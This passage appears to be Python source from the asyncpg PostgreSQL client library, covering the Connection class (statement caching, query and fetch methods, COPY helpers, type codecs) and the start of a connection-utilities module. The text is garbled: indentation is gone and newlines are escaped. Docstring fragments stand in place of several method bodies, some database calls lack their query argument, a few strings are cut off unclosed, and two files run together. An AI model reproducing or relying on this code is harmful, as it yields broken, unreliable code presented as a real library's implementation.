False\\nself._pool_release_ctr = 0\\n\\nself._addr = addr\\nself._config = config\\nself._params = params\\n\\nself._stmt_cache = _StatementCache(\\nloop=loop,\\nmax_size=config.statement_cache_size,\\non_remove=functools.partial(\\n_weak_maybe_gc_stmt, weakref.ref(self)),\\nmax_lifetime=config.max_cached_statement_lifetime)\\n\\nself._stmts_to_close = set()\\nself._stmt_cache_enabled = config.statement_cache_size > 0\\n\\nself._listeners = {}\\nself._log_listeners = set()\\nself._cancellations = set()\\nself._termination_listeners = set()\\nself._query_loggers = set()\\n\\nsettings = self._protocol.get_settings()\\nver_string = settings.server_version\\nself._server_version = \\\\\\nserverversion.split_server_version_string(ver_string)\\n\\nself._server_caps = _detect_server_capabilities(\\nself._server_version, settings)\\n\\nif self._server_version < (14, 0):\\nself._intro_query = introspection.INTRO_LOOKUP_TYPES_13\\nelse:\\nself._intro_query = introspection.INTRO_LOOKUP_TYPES\\n\\nself._reset_query = None\\nself._proxy = None\\n\\nself._stmt_exclusive_section = _Atomic()\\n\\nif loop.get_debug():\\nself._source_traceback = _extract_stack()\\nelse:\\nself._source_traceback = None\\n\\ndef __del__(self):\\nif not self.is_closed() and self._protocol is not None:\\nif self._source_traceback:\\nmsg = \\\"unclosed connection {!r}; created at:\\\\n {}\\\".format(\\nself, self._source_traceback)\\nelse:\\nmsg = (\\n\\\"unclosed connection {!r}; run in asyncio debug \\\"\\n\\\"mode to show the traceback of connection \\\"\\n\\\"origin\\\".format(self)\\n)\\n\\nwarnings.warn(msg, ResourceWarning)\\nif not self._loop.is_closed():\\nself.terminate()\\n\\nasync def add_listener(self, channel, callback):\\nself._check_open()\\nif channel not in self._listeners:\\nawait self.fetch('LISTEN {}'.format(utils._quote_ident(channel)))\\nself._listeners[channel] = set()\\nself._listeners[channel].add(_Callback.from_callable(callback))\\n\\nasync def remove_listener(self, channel, callback):\\n\\nIt will be called when asyncronous NoticeResponse is received\\nfrom the connection.  Possible message types are: WARNING, NOTICE,\\nDEBUG, INFO, or LOG.\\n\\n:param callable callback:\\nA callable or a coroutine function receiving the following\\narguments:\\n**connection**: a Connection the callback is registered with;\\n**message**: the `exceptions.PostgresLogMessage` message.\\n\\n.. versionadded:: 0.12.0\\n\\n.. versionchanged:: 0.24.0\\nThe ``callback`` argument may be a coroutine function.\\n\\n.. versionadded:: 0.12.0\\n\\n:param callable callback:\\nA callable or a coroutine function receiving one argument:\\n**connection**: a Connection the callback is registered with.\\n\\n.. versionadded:: 0.21.0\\n\\n.. versionchanged:: 0.24.0\\nThe ``callback`` argument may be a coroutine function.\\n\\n:param callable callback:\\nThe callable or coroutine function that was passed to\\n:meth:`Connection.add_termination_listener`.\\n\\n.. versionadded:: 0.21.0\\n\\n:param callable callback:\\nA callable or a coroutine function receiving one argument:\\n**record**, a LoggedQuery containing `query`, `args`, `timeout`,\\n`elapsed`, `exception`, `conn_addr`, and `conn_params`.\\n\\n.. versionadded:: 0.29.0\\n\\n:param callable callback:\\nThe callable or coroutine function that was passed to\\n:meth:`Connection.add_query_logger`.\\n\\n.. versionadded:: 0.29.0\\nreturn self._protocol.get_server_pid()\\n\\ndef get_server_version(self):\\nreturn self._server_version\\n\\ndef get_settings(self):\\nreturn self._protocol.get_settings()\\n\\ndef transaction(self, *, isolation=None, readonly=False,\\ndeferrable=False):\\nself._check_open()\\nreturn transaction.Transaction(self, isolation, readonly, deferrable)\\n\\ndef is_in_transaction(self):\\nreturn self._protocol.is_in_transaction()\\n\\nasync def execute(self, query: str, *args, timeout: float=None) -> str:\\nself._check_open()\\n\\nif not args:\\nif self._query_loggers:\\nwith self._time_and_log(query, args, timeout):\\nresult = await self._protocol.query(query, timeout)\\nelse:\\nresult = await self._protocol.query(query, timeout)\\nreturn result\\n\\n_, status, _ = await self._execute(\\nquery,\\nargs,\\n0,\\ntimeout,\\nreturn_status=True,\\n)\\nreturn status.decode()\\n\\nasync def executemany(self, command: str, args, *, timeout: float=None):\\nself._check_open()\\nreturn await self._executemany(command, args, timeout)\\n\\nasync def _get_statement(\\nself,\\nquery,\\ntimeout,\\n*,\\nnamed=False,\\nuse_cache=True,\\nignore_custom_codec=False,\\nrecord_class=None\\n):\\nif record_class is None:\\nrecord_class = self._protocol.get_record_class()\\nelse:\\n_check_record_class(record_class)\\n\\nif use_cache:\\nstatement = self._stmt_cache.get(\\n(query, record_class, ignore_custom_codec)\\n)\\nif statement is not None:\\nreturn statement\\n\\nuse_cache = (\\nself._stmt_cache_enabled\\nand (\\nnot self._config.max_cacheable_statement_size\\nor len(query) <= self._config.max_cacheable_statement_size\\n)\\n)\\n\\nif isinstance(named, str):\\nstmt_name = named\\nelif use_cache or named:\\nstmt_name = self._get_unique_id('stmt')\\nelse:\\nstmt_name = ''\\n\\nstatement = await self._protocol.prepare(\\nstmt_name,\\nquery,\\ntimeout,\\nrecord_class=record_class,\\nignore_custom_codec=ignore_custom_codec,\\n)\\nneed_reprepare = False\\ntypes_with_missing_codecs = statement._init_types()\\ntries = 0\\nwhile types_with_missing_codecs:\\nsettings = self._protocol.get_settings()\\n\\ntypes, intro_stmt = await self._introspect_types(\\ntypes_with_missing_codecs, timeout)\\n\\nsettings.register_data_types(types)\\n\\nneed_reprepare = not intro_stmt.name and not statement.name\\ntypes_with_missing_codecs = statement._init_types()\\ntries += 1\\nif tries > 5:\\nraise exceptions.InternalClientError(\\n'could not resolve query result and/or argument types '\\n'in {} attempts'.format(tries)\\n)\\n\\nstatement._init_codecs()\\n\\nif (\\nneed_reprepare\\nor (not statement.name and not self._stmt_cache_enabled)\\n):\\nstatement.mark_unprepared()\\n\\nif use_cache:\\nself._stmt_cache.put(\\n(query, record_class, ignore_custom_codec), statement)\\n\\nif self._stmts_to_close:\\nawait self._cleanup_stmts()\\n\\nreturn statement\\n\\nasync def _introspect_types(self, typeoids, timeout):\\nif self._server_caps.jit:\\ntry:\\ncfgrow, _ = await self.__execute(\\n(),\\n0,\\ntimeout,\\nignore_custom_codec=True,\\n)\\njit_state = cfgrow[0]['cur']\\nexcept exceptions.UndefinedObjectError:\\njit_state = 'off'\\nelse:\\njit_state = 'off'\\n\\nresult = await self.__execute(\\nself._intro_query,\\n(list(typeoids),),\\n0,\\ntimeout,\\nignore_custom_codec=True,\\n)\\n\\nif jit_state != 'off':\\nawait self.__execute(\\n(jit_state,),\\n0,\\ntimeout,\\nignore_custom_codec=True,\\n)\\n\\nreturn result\\n\\nasync def _introspect_type(self, typename, schema):\\nif (\\nschema == 'pg_catalog'\\nand typename.lower() in protocol.BUILTIN_TYPE_NAME_MAP\\n):\\ntypeoid = protocol.BUILTIN_TYPE_NAME_MAP[typename.lower()]\\nrows = await self._execute(\\nintrospection.TYPE_BY_OID,\\n[typeoid],\\nlimit=0,\\ntimeout=None,\\nignore_custom_codec=True,\\n)\\nelse:\\nrows = await self._execute(\\nintrospection.TYPE_BY_NAME,\\n[typename, schema],\\nlimit=1,\\ntimeout=None,\\nignore_custom_codec=True,\\n)\\n\\nif not rows:\\nraise ValueError(\\n'unknown type: {}.{}'.format(schema, typename))\\n\\nreturn rows[0]\\n\\ndef cursor(\\nself,\\nquery,\\n*args,\\nprefetch=None,\\ntimeout=None,\\nrecord_class=None\\n):\\nself._check_open()\\nreturn cursor.CursorFactory(\\nself,\\nquery,\\nNone,\\nargs,\\nprefetch,\\ntimeout,\\nrecord_class,\\n)\\n\\nasync def prepare(\\nself,\\nquery,\\n*,\\nname=None,\\ntimeout=None,\\nrecord_class=None,\\n):\\nreturn await self._prepare(\\nquery,\\nname=name,\\ntimeout=timeout,\\nuse_cache=False,\\nrecord_class=record_class,\\n)\\n\\nasync def _prepare(\\nself,\\nquery,\\n*,\\nname=None,\\ntimeout=None,\\nuse_cache: bool=False,\\nrecord_class=None\\n):\\nself._check_open()\\nstmt = await self._get_statement(\\nquery,\\ntimeout,\\nnamed=True if name is None else name,\\nuse_cache=use_cache,\\nrecord_class=record_class,\\n)\\nreturn prepared_stmt.PreparedStatement(self, query, stmt)\\n\\nasync def fetch(\\nself,\\nquery,\\n*args,\\ntimeout=None,\\nrecord_class=None\\n) -> list:\\nself._check_open()\\nreturn await self._execute(\\nquery,\\nargs,\\n0,\\ntimeout,\\nrecord_class=record_class,\\n)\\n\\nasync def fetchval(self, query, *args, column=0, timeout=None):\\nself._check_open()\\ndata = await self._execute(query, args, 1, timeout)\\nif not data:\\nreturn None\\nreturn data[0][column]\\n\\nasync def fetchrow(\\nself,\\nquery,\\n*args,\\ntimeout=None,\\nrecord_class=None\\n):\\nself._check_open()\\ndata = await self._execute(\\nquery,\\nargs,\\n1,\\ntimeout,\\nrecord_class=record_class,\\n)\\nif not data:\\nreturn None\\nreturn data[0]\\n\\nasync def fetchmany(\\nself, query, args, *, timeout: float=None, record_class=None\\n):\\nself._check_open()\\nreturn await self._executemany(\\nquery, args, timeout, return_rows=True, record_class=record_class\\n)\\n\\nasync def copy_from_table(self, table_name, *, output,\\ncolumns=None, schema_name=None, timeout=None,\\nformat=None, oids=None, delimiter=None,\\nnull=None, header=None, quote=None,\\nescape=None, force_quote=None, encoding=None):\\ntabname = utils._quote_ident(table_name)\\nif schema_name:\\ntabname = utils._quote_ident(schema_name) + '.' + tabname\\n\\nif columns:\\ncols = '({})'.format(\\n', '.join(utils._quote_ident(c) for c in columns))\\nelse:\\ncols = ''\\n\\nopts = self._format_copy_opts(\\nformat=format, oids=oids, delimiter=delimiter,\\nnull=null, header=header, quote=quote, escape=escape,\\nforce_quote=force_quote, encoding=encoding\\n)\\n\\ncopy_stmt = 'COPY {tab}{cols} TO STDOUT {opts}'.format(\\ntab=tabname, cols=cols, opts=opts)\\n\\nreturn await self._copy_out(copy_stmt, output, timeout)\\n\\nasync def copy_from_query(self, query, *args, output,\\ntimeout=None, format=None, oids=None,\\ndelimiter=None, null=None, header=None,\\nquote=None, escape=None, force_quote=None,\\nencoding=None):\\nopts = self._format_copy_opts(\\nformat=format, oids=oids, delimiter=delimiter,\\nnull=null, header=header, quote=quote, escape=escape,\\nforce_quote=force_quote, encoding=encoding\\n)\\n\\nif args:\\nquery = await utils._mogrify(self, query, args)\\n\\ncopy_stmt = 'COPY ({query}) TO STDOUT {opts}'.format(\\nquery=query, opts=opts)\\n\\nreturn await self._copy_out(copy_stmt, output, timeout)\\n\\nasync def copy_to_table(self, table_name, *, source,\\ncolumns=None, schema_name=None, timeout=None,\\nformat=None, oids=None, freeze=None,\\ndelimiter=None, null=None, header=None,\\nquote=None, escape=None, force_quote=None,\\nforce_not_null=None, force_null=None,\\nencoding=None, where=None):\\ntabname = utils._quote_ident(table_name)\\nif schema_name:\\ntabname = utils._quote_ident(schema_name) + '.' + tabname\\n\\nif columns:\\ncols = '({})'.format(\\n', '.join(utils._quote_ident(c) for c in columns))\\nelse:\\ncols = ''\\n\\ncond = self._format_copy_where(where)\\nopts = self._format_copy_opts(\\nformat=format, oids=oids, freeze=freeze, delimiter=delimiter,\\nnull=null, header=header, quote=quote, escape=escape,\\nforce_not_null=force_not_null, force_null=force_null,\\nencoding=encoding\\n)\\n\\ncopy_stmt = 'COPY {tab}{cols} FROM STDIN {opts} {cond}'.format(\\ntab=tabname, cols=cols, opts=opts, cond=cond)\\n\\nreturn await self._copy_in(copy_stmt, source, timeout)\\n\\nasync def copy_records_to_table(self, table_name, *, records,\\ncolumns=None, schema_name=None,\\ntimeout=None, where=None):\\ntabname = utils._quote_ident(table_name)\\nif schema_name:\\ntabname = utils._quote_ident(schema_name) + '.' + tabname\\n\\nif columns:\\ncol_list = ', '.join(utils._quote_ident(c) for c in columns)\\ncols = '({})'.format(col_list)\\nelse:\\ncol_list = '*'\\ncols = ''\\n\\nintro_query = 'SELECT {cols} FROM {tab} LIMIT 1'.format(\\ntab=tabname, cols=col_list)\\n\\nintro_ps = await self._prepare(intro_query, use_cache=True)\\n\\ncond = self._format_copy_where(where)\\nopts = '(FORMAT binary)'\\n\\ncopy_stmt = 'COPY {tab}{cols} FROM STDIN {opts} {cond}'.format(\\ntab=tabname, cols=cols, opts=opts, cond=cond)\\n\\nreturn await self._protocol.copy_in(\\ncopy_stmt, None, None, records, intro_ps._state, timeout)\\n\\ndef _format_copy_where(self, where):\\nif where and not self._server_caps.sql_copy_from_where:\\nraise exceptions.UnsupportedServerFeatureError(\\n'the `where` parameter requires PostgreSQL 12 or later')\\n\\nif where:\\nwhere_clause = 'WHERE ' + where\\nelse:\\nwhere_clause = ''\\n\\nreturn where_clause\\n\\ndef _format_copy_opts(self, *, format=None, oids=None, freeze=None,\\ndelimiter=None, null=None, header=None, quote=None,\\nescape=None, force_quote=None, force_not_null=None,\\nforce_null=None, encoding=None):\\nkwargs = dict(locals())\\nkwargs.pop('self')\\nopts = []\\n\\nif force_quote is not None and isinstance(force_quote, bool):\\nkwargs.pop('force_quote')\\nif force_quote:\\nopts.append('FORCE_QUOTE *')\\n\\nfor k, v in kwargs.items():\\nif v is not None:\\nif k in ('force_not_null', 'force_null', 'force_quote'):\\nv = '(' + ', '.join(utils._quote_ident(c) for c in v) + ')'\\nelif k in ('oids', 'freeze', 'header'):\\nv = str(v)\\nelse:\\nv = utils._quote_literal(v)\\n\\nopts.append('{} {}'.format(k.upper(), v))\\n\\nif opts:\\nreturn '(' + ', '.join(opts) + ')'\\nelse:\\nreturn ''\\n\\nasync def _copy_out(self, copy_stmt, output, timeout):\\ntry:\\npath = os.fspath(output)\\nexcept TypeError:\\npath = None\\n\\nwriter = None\\nopened_by_us = False\\nrun_in_executor = self._loop.run_in_executor\\n\\nif path is not None:\\nf = await run_in_executor(None, open, path, 'wb')\\nopened_by_us = True\\nelif hasattr(output, 'write'):\\nf = output\\nelif callable(output):\\nwriter = output\\nelse:\\nraise TypeError(\\n'output is expected to be a file-like object, '\\n'a path-like object or a coroutine function, '\\n'not {}'.format(type(output).__name__)\\n)\\n\\nif writer is None:\\nasync def _writer(data):\\nawait run_in_executor(None, f.write, data)\\nwriter = _writer\\n\\ntry:\\nreturn await self._protocol.copy_out(copy_stmt, writer, timeout)\\nfinally:\\nif opened_by_us:\\nf.close()\\n\\nasync def _copy_in(self, copy_stmt, source, timeout):\\ntry:\\npath = os.fspath(source)\\nexcept TypeError:\\npath = None\\n\\nf = None\\nreader = None\\ndata = None\\nopened_by_us = False\\nrun_in_executor = self._loop.run_in_executor\\n\\nif path is not None:\\nf = await run_in_executor(None, open, path, 'rb')\\nopened_by_us = True\\nelif hasattr(source, 'read'):\\nf = source\\nelif isinstance(source, collections.abc.AsyncIterable):\\nreader = source\\nelse:\\ndata = source\\n\\nif f is not None:\\nclass _Reader:\\ndef __aiter__(self):\\nreturn self\\n\\nasync def __anext__(self):\\ndata = await run_in_executor(None, f.read, 524288)\\nif len(data) == 0:\\nraise StopAsyncIteration\\nelse:\\nreturn data\\n\\nreader = _Reader()\\n\\ntry:\\nreturn await self._protocol.copy_in(\\ncopy_stmt, reader, data, None, None, timeout)\\nfinally:\\nif opened_by_us:\\nawait run_in_executor(None, f.close)\\n\\nasync def set_type_codec(self, typename, *,\\nschema='public', encoder, decoder,\\nformat='text'):\\nself._check_open()\\nsettings = self._protocol.get_settings()\\ntypeinfo = await self._introspect_type(typename, schema)\\nfull_typeinfos = []\\nif introspection.is_scalar_type(typeinfo):\\nkind = 'scalar'\\nelif introspection.is_composite_type(typeinfo):\\nif format != 'tuple':\\nraise exceptions.UnsupportedClientFeatureError(\\n'only tuple-format codecs can be used on composite types',\\nhint=\\\"Use `set_type_codec(..., format='tuple')` and \\\"\\n\\\"pass/interpret data as a Python tuple.  See an \\\"\\n\\\"example at https://magicstack.github.io/asyncpg/\\\"\\n\\\"current/usage.html\\n)\\nkind = 'composite'\\nfull_typeinfos, _ = await self._introspect_types(\\n(typeinfo['oid'],), 10)\\nelse:\\nraise exceptions.InterfaceError(\\nf'cannot use custom codec on type {schema}.{typename}: '\\nf'it is neither a scalar type nor a composite type'\\n)\\nif introspection.is_domain_type(typeinfo):\\nraise exceptions.UnsupportedClientFeatureError(\\n'custom codecs on domain types are not supported',\\nhint='Set the codec on the base type.',\\ndetail=(\\n'PostgreSQL does not distinguish domains from '\\n'their base types in query results at the protocol level.'\\n)\\n)\\n\\noid = typeinfo['oid']\\nsettings.add_python_codec(\\noid, typename, schema, full_typeinfos, kind,\\nencoder, decoder, format)\\n\\nself._drop_local_statement_cache()\\n\\nasync def reset_type_codec(self, typename, *, schema='public'):\\n\\ntypeinfo = await self._introspect_type(typename, schema)\\nself._protocol.get_settings().remove_python_codec(\\ntypeinfo['oid'], typename, schema)\\n\\nself._drop_local_statement_cache()\\n\\nasync def set_builtin_type_codec(self, typename, *,\\nschema='public', codec_name,\\nformat=None):\\nself._check_open()\\ntypeinfo = await self._introspect_type(typename, schema)\\nif not introspection.is_scalar_type(typeinfo):\\nraise exceptions.InterfaceError(\\n'cannot alias non-scalar type {}.{}'.format(\\nschema, typename))\\n\\noid = typeinfo['oid']\\n\\nself._protocol.get_settings().set_builtin_type_codec(\\noid, typename, schema, 'scalar', codec_name, format)\\n\\nself._drop_local_statement_cache()\\n\\ndef is_closed(self):\\nreturn self._aborted or not self._protocol.is_connected()\\n\\nasync def close(self, *, timeout=None):\\ntry:\\nif not self.is_closed():\\nawait self._protocol.close(timeout)\\nexcept (Exception, asyncio.CancelledError):\\nself._abort()\\nraise\\nfinally:\\nself._cleanup()\\n\\ndef terminate(self):\\n\\nCalling this will reset the connection session state to a state\\nresembling that of a newly obtained connection.  Namely, an open\\ntransaction (if any) is rolled back, open cursors are closed,\\nall `LISTEN <https://www.postgresql.org/docs/current/sql-listen.html>`_\\nregistrations are removed, all session configuration\\nvariables are reset to their default values, and all advisory locks\\nare released.\\n\\nNote that the above describes the default query returned by\\n:meth:`Connection.get_reset_query`.  If one overloads the method\\nby subclassing ``Connection``, then this method will do whatever\\nthe overloaded method returns, except open transactions are always\\nterminated and any callbacks registered by\\n:meth:`Connection.add_listener` or :meth:`Connection.add_log_listener`\\nare removed.\\n\\n:param float timeout:\\nA timeout for resetting the connection.  If not specified, defaults\\nto no timeout.\\n\\nThe query returned by this method is used by :meth:`Connection.reset`,\\nwhich is, in turn, used by :class:`~asyncpg.pool.Pool` before making\\nthe connection available to another acquirer.\\n\\n.. versionadded:: 0.30.0\\n\\nFor performance reasons, asyncpg caches certain aspects of the\\ndatabase schema, such as the layout of composite types.  Consequently,\\nwhen the database schema changes, and asyncpg is not able to\\ngracefully recover from an error caused by outdated schema\\nassumptions, an :exc:`~asyncpg.exceptions.OutdatedSchemaCacheError`\\nis raised.  To prevent the exception, this method may be used to inform\\nasyncpg that the database schema has changed.\\n\\nExample:\\n\\n.. code-block:: pycon\\n\\n>>> import asyncpg\\n>>> import asyncio\\n>>> async def change_type(con):\\n...     result = await con.fetch('SELECT id, info FROM tbl')\\n...\\n...     await con.execute('ALTER TYPE custom DROP ATTRIBUTE y')\\n...     await con.execute('ALTER TYPE custom ADD ATTRIBUTE y text')\\n...     await con.reload_schema_state()\\n...     for id_, info in result:\\n...         new = (info['x'], str(info['y']))\\n...         await con.execute(\\n...             'UPDATE tbl SET info=$2 WHERE id=$1', id_, new)\\n...\\n>>> async def run():\\n...\\n...\\n...\\n...     con = await asyncpg.connect(user='postgres')\\n...     async with con.transaction():\\n...\\n...         await con.execute('LOCK TABLE tbl')\\n...         await change_type(con)\\n...\\n>>> asyncio.run(run())\\n\\n.. versionadded:: 0.14.0\\nand removes it upon exit.\\n\\n:param callable callback:\\nA callable or a coroutine function receiving one argument:\\n**record**, a LoggedQuery containing `query`, `args`, `timeout`,\\n`elapsed`, `exception`, `conn_addr`, and `conn_params`.\\n\\nExample:\\n\\n.. code-block:: pycon\\n\\n>>> class QuerySaver:\\ndef __init__(self):\\nself.queries = []\\ndef __call__(self, record):\\nself.queries.append(record.query)\\n>>> with con.query_logger(QuerySaver()):\\n>>>     await con.execute(\\\"SELECT 1\\\")\\n>>> print(log.queries)\\n['SELECT 1']\\n\\n.. versionadded:: 0.29.0\\nif not issubclass(connection_class, Connection):\\nraise exceptions.InterfaceError(\\n'connection_class is expected to be a subclass of '\\n'asyncpg.Connection, got {!r}'.format(connection_class))\\n\\nif record_class is not protocol.Record:\\n_check_record_class(record_class)\\n\\nif loop is None:\\nloop = asyncio.get_event_loop()\\n\\nasync with compat.timeout(timeout):\\nreturn await connect_utils._connect(\\nloop=loop,\\nconnection_class=connection_class,\\nrecord_class=record_class,\\ndsn=dsn,\\nhost=host,\\nport=port,\\nuser=user,\\npassword=password,\\npassfile=passfile,\\nssl=ssl,\\ndirect_tls=direct_tls,\\ndatabase=database,\\nserver_settings=server_settings,\\ncommand_timeout=command_timeout,\\nstatement_cache_size=statement_cache_size,\\nmax_cached_statement_lifetime=max_cached_statement_lifetime,\\nmax_cacheable_statement_size=max_cacheable_statement_size,\\ntarget_session_attrs=target_session_attrs,\\nkrbsrvname=krbsrvname,\\ngsslib=gsslib,\\n)\\n\\n\\nclass _StatementCacheEntry:\\n\\n__slots__ = ('_query', '_statement', '_cache', '_cleanup_cb')\\n\\ndef __init__(self, cache, query, statement):\\nself._cache = cache\\nself._query = query\\nself._statement = statement\\nself._cleanup_cb = None\\n\\n\\nclass _StatementCache:\\n\\n__slots__ = ('_loop', '_entries', '_max_size', '_on_remove',\\n'_max_lifetime')\\n\\ndef __init__(self, *, loop, max_size, on_remove, max_lifetime):\\nself._loop = loop\\nself._max_size = max_size\\nself._on_remove = on_remove\\nself._max_lifetime = max_lifetime\\n\\nself._entries = collections.OrderedDict()\\n\\ndef __len__(self):\\nreturn len(self._entries)\\n\\ndef get_max_size(self):\\nreturn self._max_size\\n\\ndef set_max_size(self, new_size):\\nassert new_size >= 0\\nself._max_size = new_size\\nself._maybe_cleanup()\\n\\ndef get_max_lifetime(self):\\nreturn self._max_lifetime\\n\\ndef set_max_lifetime(self, new_lifetime):\\nassert new_lifetime >= 0\\nself._max_lifetime = new_lifetime\\nfor entry in self._entries.values():\\nself._set_entry_timeout(entry)\\n\\ndef get(self, query, *, promote=True):\\nif not self._max_size:\\nreturn\\n\\nentry = self._entries.get(query)\\nif entry is None:\\nreturn\\n\\nif entry._statement.closed:\\nself._entries.pop(query)\\nself._clear_entry_callback(entry)\\nreturn\\n\\nif promote:\\nself._entries.move_to_end(query, last=True)\\n\\nreturn entry._statement\\n\\ndef has(self, query):\\nreturn self.get(query, promote=False) is not None\\n\\ndef put(self, query, statement):\\nif not self._max_size:\\nreturn\\n\\nself._entries[query] = self._new_entry(query, statement)\\n\\nself._maybe_cleanup()\\n\\ndef iter_statements(self):\\nreturn (e._statement for e in self._entries.values())\\n\\ndef clear(self):\\nentries = tuple(self._entries.values())\\n\\nself._entries.clear()\\n\\nfor entry in entries:\\nself._clear_entry_callback(entry)\\nself._on_remove(entry._statement)\\n\\ndef _set_entry_timeout(self, entry):\\nself._clear_entry_callback(entry)\\n\\nif self._max_lifetime:\\nentry._cleanup_cb = self._loop.call_later(\\nself._max_lifetime, self._on_entry_expired, entry)\\n\\ndef _new_entry(self, query, statement):\\nentry = _StatementCacheEntry(self, query, statement)\\nself._set_entry_timeout(entry)\\nreturn entry\\n\\ndef _on_entry_expired(self, entry):\\nif self._entries.get(entry._query) is entry:\\nself._entries.pop(entry._query)\\nself._on_remove(entry._statement)\\n\\ndef _clear_entry_callback(self, entry):\\nif entry._cleanup_cb is not None:\\nentry._cleanup_cb.cancel()\\n\\ndef _maybe_cleanup(self):\\nwhile len(self._entries) > self._max_size:\\nold_query, old_entry = self._entries.popitem(last=False)\\nself._clear_entry_callback(old_entry)\\n\\nself._on_remove(old_entry._statement)\\n\\n\\nclass _Callback(typing.NamedTuple):\\n\\ncb: typing.Callable[..., None]\\nis_async: bool\\n\\n@classmethod\\ndef from_callable(cls, cb: typing.Callable[..., None]) -> '_Callback':\\nif inspect.iscoroutinefunction(cb):\\nis_async = True\\nelif callable(cb):\\nis_async = False\\nelse:\\nraise exceptions.InterfaceError(\\n'expected a callable or an `async def` function,'\\n'got {!r}'.format(cb)\\n)\\n\\nreturn cls(cb, is_async)\\n\\n\\nclass _Atomic:\\n__slots__ = ('_acquired',)\\n\\ndef __init__(self):\\nself._acquired = 0\\n\\ndef __enter__(self):\\nif self._acquired:\\nraise exceptions.InterfaceError(\\n'cannot perform operation: another operation is in progress')\\nself._acquired = 1\\n\\ndef __exit__(self, t, e, tb):\\nself._acquired = 0\\n\\n\\nclass _ConnectionProxy:\\n__slots__ = ()\\n\\n\\nLoggedQuery = collections.namedtuple(\\n'LoggedQuery',\\n['query', 'args', 'timeout', 'elapsed', 'exception', 'conn_addr',\\n'conn_params'])\\nLoggedQuery.__doc__ = 'Log record of an executed query.'\\n\\n\\nServerCapabilities = collections.namedtuple(\\n'ServerCapabilities',\\n['advisory_locks', 'notifications', 'plpgsql', 'sql_reset',\\n'sql_close_all', 'sql_copy_from_where', 'jit'])\\nServerCapabilities.__doc__ = 'PostgreSQL server capabilities.'\\n\\n\\ndef _detect_server_capabilities(server_version, connection_settings):\\nif hasattr(connection_settings, 'padb_revision'):\\nadvisory_locks = False\\nnotifications = False\\nplpgsql = False\\nsql_reset = True\\nsql_close_all = False\\njit = False\\nsql_copy_from_where = False\\nelif hasattr(connection_settings, 'crdb_version'):\\nadvisory_locks = False\\nnotifications = False\\nplpgsql = False\\nsql_reset = False\\nsql_close_all = False\\njit = False\\nsql_copy_from_where = False\\nelif hasattr(connection_settings, 'crate_version'):\\nadvisory_locks = False\\nnotifications = False\\nplpgsql = False\\nsql_reset = False\\nsql_close_all = False\\njit = False\\nsql_copy_from_where = False\\nelse:\\nadvisory_locks = True\\nnotifications = True\\nplpgsql = True\\nsql_reset = True\\nsql_close_all = True\\njit = server_version >= (11, 0)\\nsql_copy_from_where = server_version.major >= 12\\n\\nreturn ServerCapabilities(\\nadvisory_locks=advisory_locks,\\nnotifications=notifications,\\nplpgsql=plpgsql,\\nsql_reset=sql_reset,\\nsql_close_all=sql_close_all,\\nsql_copy_from_where=sql_copy_from_where,\\njit=jit,\\n)\\n\\n\\ndef _extract_stack(limit=10):\\nframe = sys._getframe().f_back\\ntry:\\nstack = traceback.StackSummary.extract(\\ntraceback.walk_stack(frame), lookup_lines=False)\\nfinally:\\ndel frame\\n\\napg_path = asyncpg.__path__[0]\\ni = 0\\nwhile i < len(stack) and stack[i][0].startswith(apg_path):\\ni += 1\\nstack = stack[i:i + limit]\\n\\nstack.reverse()\\nreturn ''.join(traceback.format_list(stack))\\n\\n\\ndef _check_record_class(record_class):\\nif record_class is protocol.Record:\\npass\\nelif (\\nisinstance(record_class, type)\\nand issubclass(record_class, protocol.Record)\\n):\\nif (\\nrecord_class.__new__ is not object.__new__\\nor record_class.__init__ is not object.__init__\\n):\\nraise exceptions.InterfaceError(\\n'record_class must not redefine __new__ or __init__'\\n)\\nelse:\\nraise exceptions.InterfaceError(\\n'record_class is expected to be a subclass of '\\n'asyncpg.Record, got {!r}'.format(record_class)\\n)\\n\\n\\ndef _weak_maybe_gc_stmt(weak_ref, stmt):\\nself = weak_ref()\\nif self is not None:\\nself._maybe_gc_stmt(stmt)\\n\\n\\n_uid = 0\\n\\n\\nimport asyncio\\nimport collections\\nimport enum\\nimport functools\\nimport getpass\\nimport os\\nimport pathlib\\nimport platform\\nimport random\\nimport re\\nimport socket\\nimport ssl as ssl_module\\nimport stat\\nimport struct\\nimport sys\\nimport typing\\nimport urllib.parse\\nimport warnings\\nimport inspect\\n\\nfrom . import compat\\nfrom . import exceptions\\nfrom . import protocol\\n\\n\\nclass SSLMode(enum.IntEnum):\\ndisable = 0\\nallow = 1\\nprefer = 2\\nrequire = 3\\nverify_ca = 4\\nverify_full = 5\\n\\n@classmethod\\ndef parse(cls, sslmode):\\nif isinstance(sslmode, cls):\\nreturn sslmode\\nreturn getattr(cls, sslmode.replace('-', '_'))\\n\\n\\nclass SSLNegotiation(compat.StrEnum):\\npostgres = \\\"postgres\\\"\\ndirect = \\\"direct\\\"\\n\\n\\n_ConnectionParameters = collections.namedtuple(\\n'ConnectionParameters',\\n[\\n'user',\\n'password',\\n'database',\\n'ssl',\\n'sslmode',\\n'ssl_negotiation',\\n'server_settings',\\n'target_session_attrs',\\n'krbsrvname',\\n'gsslib',\\n])\\n\\n\\n_ClientConfiguration = collections.namedtuple(\\n'ConnectionConfiguration',\\n[\\n'command_timeout',\\n'statement_cache_size',\\n'max_cached_statement_lifetime',\\n'max_cacheable_statement_size',\\n])\\n\\n\\n_system = platform.uname().system\\n\\n\\nif _system == 'Windows':\\nPGPASSFILE = 'pgpass.conf'\\nelse:\\nPGPASSFILE = '.pgpass'\\n\\n\\ndef _read_password_file(passfile: pathlib.Path) \\\\\\n-> typing.List[typing.Tuple[str, ...]]:\\n\\npasstab = []\\n\\ntry:\\nif not passfile.exists():\\nreturn []\\n\\nif not passfile.is_file():\\nwarnings.warn(\\n'password file {!r} is not a plain file'.format(passfile))\\n\\nreturn []\\n\\nif _system != 'Windows':\\nif passfile.stat().st_mode & (stat.S_IRWXG | stat.S_IRWXO):\\nwarnings.warn(\\n'password file {!r} has group or world access; '\\n'permissions should be u=rw (0600) or less'.format(\\npassfile))\\n\\nreturn []\\n\\nwith passfile.open('rt') as f:\\nfor line in f:\\nline = line.strip()\\nif not line or line.startswith('\\ncontinue\\nline = line.replace(R'\\\\\\\\', '\\\\n')\\npasstab.append(tuple(\\np.replace('\\\\n', R'\\\\\\\\')\\nfor p in re.split(r'(?<!\\\\\\\\):', line, maxsplit=4)\\n))\\nexcept IOError:\\npass\\n\\nreturn passtab\\n\\n\\ndef _read_password_from_pgpass(\\n*, passfile: typing.Optional[pathlib.Path],\\nhosts: typing.List[str],\\nports: typing.List[int],\\ndatabase: str,\\nuser: 